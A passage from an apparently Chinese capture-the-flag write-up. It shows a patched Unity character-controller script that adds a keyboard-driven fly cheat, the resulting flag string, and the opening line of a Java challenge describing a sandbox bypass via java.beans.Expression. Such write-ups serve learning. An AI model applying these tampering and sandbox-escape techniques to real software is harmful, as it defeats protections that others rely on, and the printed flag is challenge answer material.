class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.InputSystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">StarterAssets</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">RequireComponent(typeof(CharacterController))</span>]</span><br><span class="line">    [<span class="meta">RequireComponent(typeof(PlayerInput))</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ThirdPersonController</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">bool</span> IsCurrentDeviceMouse</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">get</span> &#123; <span class="keyword">return</span> <span class="keyword">this</span>._playerInput.currentControlScheme == <span class="string">&quot;KeyboardMouse&quot;</span>; &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Awake</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._mainCamera == <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._mainCamera = GameObject.FindGameObjectWithTag(<span class="string">&quot;MainCamera&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>._cinemachineTargetYaw = <span class="keyword">this</span>.CinemachineCameraTarget.transform.rotation.eulerAngles.y;</span><br><span class="line">            <span class="keyword">this</span>._hasAnimator = <span class="keyword">base</span>.TryGetComponent(<span class="keyword">out</span> <span class="keyword">this</span>._animator);</span><br><span class="line">            <span class="keyword">this</span>._controller = <span class="keyword">base</span>.GetComponent&lt;CharacterController&gt;();</span><br><span class="line">            <span class="keyword">this</span>._input = <span class="keyword">base</span>.GetComponent&lt;StarterAssetsInputs&gt;();</span><br><span class="line">            <span class="keyword">this</span>._playerInput = <span class="keyword">base</span>.GetComponent&lt;PlayerInput&gt;();</span><br><span class="line">            <span class="keyword">this</span>.AssignAnimationIDs();</span><br><span class="line">            <span class="keyword">this</span>._jumpTimeoutDelta = <span class="keyword">this</span>.JumpTimeout;</span><br><span class="line">            <span class="keyword">this</span>._fallTimeoutDelta = <span class="keyword">this</span>.FallTimeout;</span><br><span class="line"></span><br><span class="line">            Debug.Log(<span class="string">&quot;[CHEAT] ThirdPersonController loaded&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>._hasAnimator = <span class="keyword">base</span>.TryGetComponent(<span class="keyword">out</span> <span class="keyword">this</span>._animator);</span><br><span class="line">            <span class="keyword">this</span>.JumpAndGravity();</span><br><span class="line">            <span class="keyword">this</span>.GroundedCheck();</span><br><span class="line">            <span class="keyword">this</span>.Move();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">LateUpdate</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.CameraRotation();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AssignAnimationIDs</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>._animIDSpeed = Animator.StringToHash(<span class="string">&quot;Speed&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>._animIDGrounded = Animator.StringToHash(<span class="string">&quot;Grounded&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>._animIDJump = Animator.StringToHash(<span class="string">&quot;Jump&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>._animIDFreeFall = Animator.StringToHash(<span class="string">&quot;FreeFall&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>._animIDMotionSpeed = Animator.StringToHash(<span class="string">&quot;MotionSpeed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">GroundedCheck</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Vector3 origin = <span class="keyword">new</span> Vector3(transform.position.x, transform.position.y - <span class="keyword">this</span>.GroundedOffset, transform.position.z);</span><br><span class="line">            <span class="keyword">this</span>.Grounded = Physics.CheckSphere(origin, <span class="keyword">this</span>.GroundedRadius, <span class="keyword">this</span>.GroundLayers, QueryTriggerInteraction.Ignore);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._hasAnimator)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDGrounded, <span class="keyword">this</span>.Grounded);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CameraRotation</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._input.look.sqrMagnitude &gt;= <span class="number">0.01f</span> &amp;&amp; !<span class="keyword">this</span>.LockCameraPosition)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">float</span> multiplier = <span class="keyword">this</span>.IsCurrentDeviceMouse ? <span class="number">1f</span> : Time.deltaTime;</span><br><span class="line">                <span class="keyword">this</span>._cinemachineTargetYaw += <span class="keyword">this</span>._input.look.x * multiplier;</span><br><span class="line">                <span class="keyword">this</span>._cinemachineTargetPitch += <span class="keyword">this</span>._input.look.y * multiplier;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>._cinemachineTargetYaw = ThirdPersonController.ClampAngle(<span class="keyword">this</span>._cinemachineTargetYaw, <span class="built_in">float</span>.MinValue, <span class="built_in">float</span>.MaxValue);</span><br><span class="line">            <span class="keyword">this</span>._cinemachineTargetPitch = ThirdPersonController.ClampAngle(<span class="keyword">this</span>._cinemachineTargetPitch, <span class="keyword">this</span>.BottomClamp, <span class="keyword">this</span>.TopClamp);</span><br><span class="line">            <span class="keyword">this</span>.CinemachineCameraTarget.transform.rotation = Quaternion.Euler(<span class="keyword">this</span>._cinemachineTargetPitch + <span class="keyword">this</span>.CameraAngleOverride, <span class="keyword">this</span>._cinemachineTargetYaw, <span class="number">0f</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Move</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">float</span> targetSpeed = <span class="keyword">this</span>._input.sprint ? <span class="keyword">this</span>.SprintSpeed : <span class="keyword">this</span>.MoveSpeed;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._input.move == Vector2.zero)</span><br><span class="line">            &#123;</span><br><span class="line">                targetSpeed = <span class="number">0f</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">float</span> currentHorizontalSpeed = <span class="keyword">new</span> Vector3(<span class="keyword">this</span>._controller.velocity.x, <span class="number">0f</span>, <span class="keyword">this</span>._controller.velocity.z).magnitude;</span><br><span class="line">            <span class="built_in">float</span> speedOffset = <span class="number">0.1f</span>;</span><br><span class="line">            <span class="built_in">float</span> inputMagnitude = <span class="keyword">this</span>._input.analogMovement ? <span class="keyword">this</span>._input.move.magnitude : <span class="number">1f</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (currentHorizontalSpeed &lt; targetSpeed - speedOffset || currentHorizontalSpeed &gt; targetSpeed + speedOffset)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._speed = Mathf.Lerp(currentHorizontalSpeed, targetSpeed * inputMagnitude, Time.deltaTime * <span class="keyword">this</span>.SpeedChangeRate);</span><br><span class="line">                <span class="keyword">this</span>._speed = Mathf.Round(<span class="keyword">this</span>._speed * <span class="number">1000f</span>) / <span class="number">1000f</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._speed = targetSpeed;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>._animationBlend = Mathf.Lerp(<span class="keyword">this</span>._animationBlend, targetSpeed, Time.deltaTime * <span class="keyword">this</span>.SpeedChangeRate);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._animationBlend &lt; <span class="number">0.01f</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._animationBlend = <span class="number">0f</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Vector3 inputDirection = <span class="keyword">new</span> Vector3(<span class="keyword">this</span>._input.move.x, <span class="number">0f</span>, <span class="keyword">this</span>._input.move.y).normalized;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._input.move != Vector2.zero)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._targetRotation = Mathf.Atan2(inputDirection.x, inputDirection.z) * Mathf.Rad2Deg + <span class="keyword">this</span>._mainCamera.transform.eulerAngles.y;</span><br><span class="line">                <span class="built_in">float</span> rotation = Mathf.SmoothDampAngle(transform.eulerAngles.y, <span class="keyword">this</span>._targetRotation, <span class="keyword">ref</span> <span class="keyword">this</span>._rotationVelocity, <span class="keyword">this</span>.RotationSmoothTime);</span><br><span class="line">                transform.rotation = Quaternion.Euler(<span class="number">0f</span>, rotation, <span class="number">0f</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Vector3 targetDirection = Quaternion.Euler(<span class="number">0f</span>, <span class="keyword">this</span>._targetRotation, <span class="number">0f</span>) * Vector3.forward;</span><br><span class="line">            Vector3 move = targetDirection.normalized * (<span class="keyword">this</span>._speed * Time.deltaTime);</span><br><span class="line">            move += <span class="keyword">new</span> Vector3(<span class="number">0f</span>, <span class="keyword">this</span>._verticalVelocity * Time.deltaTime, <span class="number">0f</span>);</span><br><span class="line">            <span class="keyword">this</span>._controller.Move(move);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._hasAnimator)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._animator.SetFloat(<span class="keyword">this</span>._animIDSpeed, <span class="keyword">this</span>._animationBlend);</span><br><span class="line">                <span class="keyword">this</span>._animator.SetFloat(<span class="keyword">this</span>._animIDMotionSpeed, inputMagnitude);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">JumpAndGravity</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">float</span> flySpeed = <span class="number">12f</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">bool</span> ascend = <span class="literal">false</span>;</span><br><span class="line">            <span class="built_in">bool</span> descend = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            Keyboard keyboard = Keyboard.current;</span><br><span class="line">            <span class="keyword">if</span> (keyboard != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (keyboard.spaceKey != <span class="literal">null</span> &amp;&amp; keyboard.spaceKey.isPressed)</span><br><span class="line">                &#123;</span><br><span class="line">                    ascend = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ((keyboard.leftCtrlKey != <span class="literal">null</span> &amp;&amp; keyboard.leftCtrlKey.isPressed) ||</span><br><span class="line">                    (keyboard.rightCtrlKey != <span class="literal">null</span> &amp;&amp; keyboard.rightCtrlKey.isPressed))</span><br><span class="line">                &#123;</span><br><span class="line">                    descend = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ascend || descend)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._verticalVelocity = ascend ? flySpeed : -flySpeed;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>._input.jump = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">this</span>._jumpTimeoutDelta = <span class="keyword">this</span>.JumpTimeout;</span><br><span class="line">                <span class="keyword">this</span>._fallTimeoutDelta = <span class="keyword">this</span>.FallTimeout;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._hasAnimator)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDJump, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDFreeFall, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDGrounded, <span class="literal">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.Grounded)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._fallTimeoutDelta = <span class="keyword">this</span>.FallTimeout;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._hasAnimator)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDJump, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDFreeFall, <span class="literal">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._verticalVelocity &lt; <span class="number">0f</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._verticalVelocity = <span class="number">-2f</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._input.jump &amp;&amp; <span class="keyword">this</span>._jumpTimeoutDelta &lt;= <span class="number">0f</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._verticalVelocity = Mathf.Sqrt(<span class="keyword">this</span>.JumpHeight * <span class="number">-2f</span> * <span class="keyword">this</span>.Gravity);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>._hasAnimator)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDJump, <span class="literal">true</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._jumpTimeoutDelta &gt;= <span class="number">0f</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._jumpTimeoutDelta -= Time.deltaTime;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._jumpTimeoutDelta = <span class="keyword">this</span>.JumpTimeout;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._fallTimeoutDelta &gt;= <span class="number">0f</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._fallTimeoutDelta -= Time.deltaTime;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>._hasAnimator)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDFreeFall, <span class="literal">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">this</span>._input.jump = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._verticalVelocity &lt; <span class="keyword">this</span>._terminalVelocity)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._verticalVelocity += <span class="keyword">this</span>.Gravity * Time.deltaTime;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">float</span> <span class="title">ClampAngle</span>(<span class="params"><span class="built_in">float</span> angle, <span class="built_in">float</span> min, <span class="built_in">float</span> max</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (angle &lt; <span class="number">-360f</span>) angle += <span class="number">360f</span>;</span><br><span class="line">            <span class="keyword">if</span> (angle &gt; <span class="number">360f</span>) angle -= <span class="number">360f</span>;</span><br><span class="line">            <span class="keyword">return</span> Mathf.Clamp(angle, min, max);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnDrawGizmosSelected</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Gizmos.color = <span class="keyword">this</span>.Grounded ? <span class="keyword">new</span> Color(<span class="number">0f</span>, <span class="number">1f</span>, <span class="number">0f</span>, <span class="number">0.35f</span>) : <span class="keyword">new</span> Color(<span class="number">1f</span>, <span class="number">0f</span>, <span class="number">0f</span>, <span class="number">0.35f</span>);</span><br><span class="line">            Gizmos.DrawSphere(<span class="keyword">new</span> Vector3(transform.position.x, transform.position.y - <span class="keyword">this</span>.GroundedOffset, transform.position.z), <span class="keyword">this</span>.GroundedRadius);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnFootstep</span>(<span class="params">AnimationEvent animationEvent</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (animationEvent.animatorClipInfo.weight &gt; <span class="number">0.5f</span> &amp;&amp; <span class="keyword">this</span>.FootstepAudioClips.Length != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">int</span> index = UnityEngine.Random.Range(<span class="number">0</span>, <span class="keyword">this</span>.FootstepAudioClips.Length);</span><br><span class="line">                AudioSource.PlayClipAtPoint(<span class="keyword">this</span>.FootstepAudioClips[index], transform.TransformPoint(<span class="keyword">this</span>._controller.center), <span class="keyword">this</span>.FootstepAudioVolume);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnLand</span>(<span class="params">AnimationEvent animationEvent</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (animationEvent.animatorClipInfo.weight &gt; <span class="number">0.5f</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                AudioSource.PlayClipAtPoint(<span class="keyword">this</span>.LandingAudioClip, transform.TransformPoint(<span class="keyword">this</span>._controller.center), <span class="keyword">this</span>.FootstepAudioVolume);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Header(<span class="string">&quot;Player&quot;</span>)</span>] <span class="keyword">public</span> <span class="built_in">float</span> MoveSpeed = <span class="number">2f</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> SprintSpeed = <span class="number">5.335f</span>;</span><br><span class="line">        [<span class="meta">Range(0f, 0.3f)</span>] <span class="keyword">public</span> <span class="built_in">float</span> RotationSmoothTime = <span class="number">0.12f</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> SpeedChangeRate = <span class="number">10f</span>;</span><br><span class="line">        <span class="keyword">public</span> AudioClip LandingAudioClip;</span><br><span class="line">        <span class="keyword">public</span> AudioClip[] FootstepAudioClips;</span><br><span class="line">        [<span class="meta">Range(0f, 1f)</span>] <span class="keyword">public</span> <span class="built_in">float</span> FootstepAudioVolume = <span class="number">0.5f</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Space(10f)</span>] <span class="keyword">public</span> <span class="built_in">float</span> JumpHeight = <span class="number">1.2f</span>;</span><br><span class="line">        [<span class="meta">Tooltip(<span class="string">&quot;The character uses its own gravity value. The engine default is -9.81f&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> Gravity = <span class="number">-15f</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Space(10f)</span>] <span class="keyword">public</span> <span class="built_in">float</span> JumpTimeout = <span class="number">0.5f</span>;</span><br><span class="line">        [<span class="meta">Tooltip(<span class="string">&quot;Time required to pass before entering the fall state. Useful for walking down stairs&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> FallTimeout = <span class="number">0.15f</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Header(<span class="string">&quot;Player Grounded&quot;</span>)</span>] <span class="keyword">public</span> <span class="built_in">bool</span> Grounded = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> GroundedOffset = <span class="number">-0.14f</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> GroundedRadius = <span class="number">0.28f</span>;</span><br><span class="line">        <span class="keyword">public</span> LayerMask GroundLayers;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Header(<span class="string">&quot;Cinemachine&quot;</span>)</span>] <span class="keyword">public</span> GameObject CinemachineCameraTarget;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> TopClamp = <span class="number">70f</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> BottomClamp = <span class="number">-30f</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> CameraAngleOverride;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">bool</span> LockCameraPosition;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _cinemachineTargetYaw;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _cinemachineTargetPitch;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _speed;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _animationBlend;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _targetRotation;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _rotationVelocity;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _verticalVelocity;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _terminalVelocity = <span class="number">53f</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _jumpTimeoutDelta;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _fallTimeoutDelta;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> _animIDSpeed;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> _animIDGrounded;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> _animIDJump;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> _animIDFreeFall;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> _animIDMotionSpeed;</span><br><span class="line">        <span class="keyword">private</span> PlayerInput _playerInput;</span><br><span class="line">        <span class="keyword">private</span> Animator _animator;</span><br><span class="line">        <span class="keyword">private</span> CharacterController _controller;</span><br><span class="line">        <span class="keyword">private</span> StarterAssetsInputs _input;</span><br><span class="line">        <span class="keyword">private</span> GameObject _mainCamera;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">const</span> <span class="built_in">float</span> _threshold = <span class="number">0.01f</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">bool</span> _hasAnimator;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251018165235177.png" alt="image-20251018165235177"></p><p>flag2：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251018150628235.png" alt="image-20251018150628235"></p><p>flag{v2ew_beh2nd_the_scene}</p><h3 id="7-岁的毛毛：我要写-Javabinary-java"><a href="#7-岁的毛毛：我要写-Javabinary-java" class="headerlink" title="7 岁的毛毛：我要写 Javabinary-java"></a>7 岁的毛毛：我要写 Javabinary-java</h3><h4 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h4><p>利用 java.beans.Expression 代替我们手动调用 Class.getDeclaredField，从而绕过 Blocker 对 Class.* 